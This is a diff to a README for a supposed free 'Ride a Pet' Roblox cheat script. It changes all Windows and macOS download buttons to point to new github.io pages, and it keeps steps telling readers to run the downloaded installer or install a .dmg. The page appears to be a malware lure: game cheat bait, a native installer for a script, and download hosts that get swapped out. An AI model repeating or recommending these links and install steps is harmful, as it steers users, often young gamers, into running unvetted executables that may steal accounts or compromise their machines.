@@ -4,9 +4,9 @@
 
 > 🐾 Ride a Pet script with auto ride, pet farm, speed boost, and race win tools. Collect every pet and dominate every race with the strongest stable.
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 Whether you're grinding for hours or just getting started, **Ride a Pet Script** delivers everything you need to dominate the game. Built for both casual players and dedicated grinders, this free Roblox script gives you the edge to progress faster, earn more, and enjoy the game on your own terms.
 
@@ -16,7 +16,7 @@ Whether you're grinding for hours or just getting started, **Ride a Pet Script**
 - Regular updates to stay compatible with the latest game patches
 - Lightweight and optimized for smooth gameplay
 
-### [⬇️ Download Ride a Pet Script](https://yobowgileysb.github.io/WinDownload/)
+### [⬇️ Download Ride a Pet Script](https://mixedlinkrelease.github.io/installer/)
 
 ---
 
@@ -65,7 +65,7 @@ Whether you're grinding for hours or just getting started, **Ride a Pet Script**
 
 ### 🖥️ Windows (PC)
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
 1. Click the **Download for Windows** button above
 2. Run the downloaded installer file
@@ -77,7 +77,7 @@ Whether you're grinding for hours or just getting started, **Ride a Pet Script**
 
 ### 🍏 macOS (Intel/Apple Silicon)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the **Download for macOS** button above
 2. Open the downloaded `.dmg` and drag to Applications
